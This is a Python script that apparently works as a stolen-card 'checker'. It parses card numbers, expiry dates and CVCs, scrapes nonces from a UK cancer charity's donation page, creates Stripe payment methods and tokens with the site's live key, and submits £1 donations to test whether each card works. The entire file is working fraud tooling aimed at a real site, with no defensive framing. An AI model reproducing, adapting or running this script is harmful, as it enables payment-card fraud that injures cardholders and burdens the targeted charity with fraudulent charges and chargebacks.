import requests,re
import random
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'workingwithcancer.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://workingwithcancer.co.uk/about-us/social-enterprise/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://workingwithcancer.co.uk/about-us/social-enterprise/', headers=headers)
	
	value = re.search(r'"value":"(.*?)"', response.text).group(1)
	amount = re.search(r'"amount":"(.*?)"', response.text).group(1)
	button_id = re.search(r'"button_id":"(.*?)"', response.text).group(1)
	instance = re.search(r'"instance":"(.*?)"', response.text).group(1)
	ds_nonce = re.search(r'"ds_nonce":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fce2f5f1f6a%3B+stripe-js-v3%2Fce2f5f1f6a%3B+card-element&key=pk_live_pNFXuqpgFDuKmm4l4ulIHPw500TyrGsOuj'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fce2f5f1f6a%3B+stripe-js-v3%2Fce2f5f1f6a%3B+card-element&key=pk_live_pNFXuqpgFDuKmm4l4ulIHPw500TyrGsOuj'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	
	tok = response.json()['id']
	
	headers = {
	    'authority': 'workingwithcancer.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://workingwithcancer.co.uk',
	    'referer': 'https://workingwithcancer.co.uk/about-us/social-enterprise/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'ds_process_button',
	    'stripeToken': f'{tok}',
	    'paymentMethodID': f'{pm}',
	    'allData[billingDetails][email]': 'rodamuser08@gmail.com',
	    'type': 'donation',
	    'amount': '1',
	    'params[value]': f'{value}',
	    'params[name]': 'Working With Cancer',
	    'params[amount]': f'{amount}',
	    'params[original_amount]': '1',
	    'params[description]': 'Make a donation to help coach cancer survivors.',
	    'params[panellabel]': 'Confirm payment',
	    'params[type]': 'donation',
	    'params[coupon]': '',
	    'params[setup_fee]': '',
	    'params[zero_decimal]': '',
	    'params[capture]': '1',
	    'params[display_amount]': '1',
	    'params[currency]': 'GBP',
	    'params[locale]': 'en',
	    'params[success_query]': '',
	    'params[error_query]': '',
	    'params[success_url]': '',
	    'params[error_url]': '',
	    'params[button_id]': f'{button_id}',
	    'params[custom_role]': '',
	    'params[billing]': '',
	    'params[shipping]': '',
	    'params[rememberme]': '',
	    'params[key]': 'pk_live_pNFXuqpgFDuKmm4l4ulIHPw500TyrGsOuj',
	    'params[current_email_address]': '',
	    'params[ajaxurl]': 'https://workingwithcancer.co.uk/wp-admin/admin-ajax.php',
	    'params[image]': 'https://workingwithcancer.co.uk/content/files/Working-with-cancer-header-002-300x166.jpg',
	    'params[instance]': f'{instance}',
	    'params[ds_nonce]': f'{ds_nonce}',
	    'ds_nonce': f'{ds_nonce}',
	}
	
	response = requests.post('https://workingwithcancer.co.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	result = response.json()['message']

	return (result)
